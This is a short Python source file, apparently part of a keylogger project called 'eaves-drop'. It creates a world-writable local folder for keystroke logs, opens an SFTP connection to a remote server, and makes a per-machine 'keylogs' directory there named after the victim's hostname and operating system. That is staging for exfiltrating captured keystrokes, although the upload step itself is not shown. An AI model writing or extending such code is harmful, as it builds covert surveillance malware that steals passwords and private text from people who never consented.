from pathlib import Path
import system_info
from connect import connect as sftp_server

local_keylogs_dir = Path('/tmp/eaves-drop/keylogs')
local_keylogs_dir.mkdir(0o777, parents=True, exist_ok=True)

remote_dir = Path('/root/{node}-{system}'.format(node=system_info.node, system=system_info.system))
remote_keylogs_dir = remote_dir / 'keylogs'

sftp_server = sftp_server()

if not sftp_server.isdir(bytes(remote_dir)):
    sftp_server.mkdir(bytes(remote_dir))
if not sftp_server.isdir(bytes(remote_keylogs_dir)):
    sftp_server.mkdir(bytes(remote_keylogs_dir))